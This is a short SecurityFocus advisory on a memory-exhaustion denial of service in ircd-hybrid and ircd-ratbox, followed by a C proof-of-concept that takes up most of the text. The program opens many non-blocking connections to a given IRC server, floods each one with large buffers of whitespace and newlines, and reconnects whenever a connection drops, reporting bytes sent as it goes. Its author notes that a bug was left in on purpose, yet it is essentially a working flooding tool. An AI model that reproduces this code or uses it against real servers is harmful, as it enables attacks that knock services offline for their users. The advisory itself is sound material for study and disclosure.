source: http://www.securityfocus.com/bid/10572/info

A denial of service vulnerability exists in multiple ircd implementations. This exists because of an issue with the deallocation of buffers used by rate limiting mecahnisms in the ircd. This could result in exhaustion of memory resources on the system running the ircd.

This issue was reported to exist in ircd-hybrid version 7.0.1 and earlier, ircd-ratbox 1.5.1 and earlier, and ircd-ratbox 2.0rc6 and earlier.

// Proof of concept - remote ircd-hybrid-7/ircd-ratbox DoS
//
// ./kiddie-proofed - you'll need to correct a bug
//
// Tested on linux, should work with minor tweaks on other platforms
//
// -- Erik Sperling Johansen <einride@einride.org>

#include <stdlib.h>
#include <stdio.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/signal.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <string.h>
#include <time.h>

int done = 0;


void siginthandler(int x) {
  fprintf(stdout, "Exiting\n");
  done = 1;
}
void usage(const char * b) {
  fprintf(stderr, "%s ip port connectioncount\n", b);
  exit(1);
}

int makeconn(struct sockaddr_in * sin) {
  int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (s < 0) {
    perror("socket");
    return -1;
  }
  int n=1;
  if (ioctl(s, FIONBIO, &n, sizeof(n))) {
    perror("ioctl");
    close(s);
    return -1;
  }
  errno = 0;
  if ((connect(s, (struct sockaddr *) sin, sizeof(sin)) == -1)
    && (errno != EINPROGRESS)) {
    perror("connect");
    close(s);
    return -1;
  }
  return s;
};

int main(int argc, const char ** argv, const char ** envp) {
  fd_set wfd, rfd;
  FD_ZERO(&wfd);
  FD_ZERO(&rfd);
  if (argc != 4)
    usage(argv[0]);
  struct sockaddr_in sin;
  memset(&sin, 0, sizeof(sin));
  sin.sin_addr.s_addr = inet_addr(argv[1]);
  if (sin.sin_addr.s_addr == INADDR_NONE)
    usage(argv[0]);
  sin.sin_port = htons(atoi(argv[2]));
  sin.sin_family = AF_INET;
  int conncount = atoi(argv[3]);
  if ((conncount <= 0) || (conncount > FD_SETSIZE-5))
    usage(argv[0]);
  int * sockets = (int *) malloc(conncount * sizeof(int));
  int i, highsock = 0;
  char buf[65536];
  char dummy[65536];
  for (i=0; i<sizeof(buf)-1; i+=2) {
    buf[i] = ' ';
    buf[i+1] = '\n';
  }
  for (i = 0; i<conncount; ++i)
    sockets[i] = -1;
  highsock = -1;
  int CountConnects = 0, CountBytes = 0, CurCountBytes = 0;
  time_t Started = time(0), LastRep = time(0);
  signal(SIGPIPE, SIG_IGN);
  signal(SIGINT, siginthandler);
  while (!done) {
    fd_set w, r;
    if (highsock == -1) {
      for (i=0;i<conncount;++i) {
        if (sockets[i] < 0) {
          sockets[i] = makeconn(&sin);
          if (sockets[i] >= 0) {
            ++CountConnects;
            FD_SET(sockets[i], &wfd);
            FD_SET(sockets[i], &rfd);
          }
          if (highsock < sockets[i])
            highsock = sockets[i];
        }
      }
    }
    memcpy(&w, &wfd, sizeof(w));
    memcpy(&r, &rfd, sizeof(r));
    struct timeval tv = { 1, 0 };
    int c = select(highsock+1, &r, &w, 0, &tv);
    for (i = 0; (i<conncount) && (c > 0); ++i) {
      if (sockets[i] >= 0) {
        if (FD_ISSET(sockets[i], &w)) {
          int bytes = send(sockets[i], buf, sizeof(buf), 0);
          if (bytes > 0) {
            CountBytes += bytes;
            CurCountBytes += bytes;
          } else {
#ifndef NONOISE
            perror("send");
#endif
            FD_CLR(sockets[i], &wfd);
            FD_CLR(sockets[i], &rfd);
            close(sockets[i]);
#ifndef NONOISE
            fprintf(stdout, "(send) Lost conn on socket %i, 
reconnecting\n",
sockets[i]);
#endif
            sockets[i] = -1;
            highsock = -1;
          }
        }
      }
      if (sockets[i] >= 0) {
        if (FD_ISSET(sockets[i], &r)) {
          errno = 0;
          if (recv(sockets[i], dummy, sizeof(dummy), 0) <= 0) {
#ifndef NONOISE
            perror("recv");
#endif
            FD_CLR(sockets[i], &wfd);
            FD_CLR(sockets[i], &rfd);
            close(sockets[i]);
#ifndef NONOISE
            fprintf(stdout, "(recv) Lost conn on socket %i, 
reconnecting\n",
            sockets[i]);
#endif
            sockets[i] = -1;
            highsock = -1;
          }
        }
      }
    }

    if (time(0) - LastRep > 5) {
      fprintf(stdout, "%i connects made - Total: %i bytes, %li BPS - Last
period: %i bytes, %li BPS\n", CountConnects, CountBytes, CountBytes /
(time(0) - Started), CurCountBytes, CurCountBytes / (time(0) - LastRep));
      LastRep = time(0);
      CurCountBytes = 0;
    }
  }
  fprintf(stdout, "%i connects made - Total: %i bytes, %li BPS\n",
CountConnects, CountBytes, CountBytes / (time(0) - Started));

  return 0;
}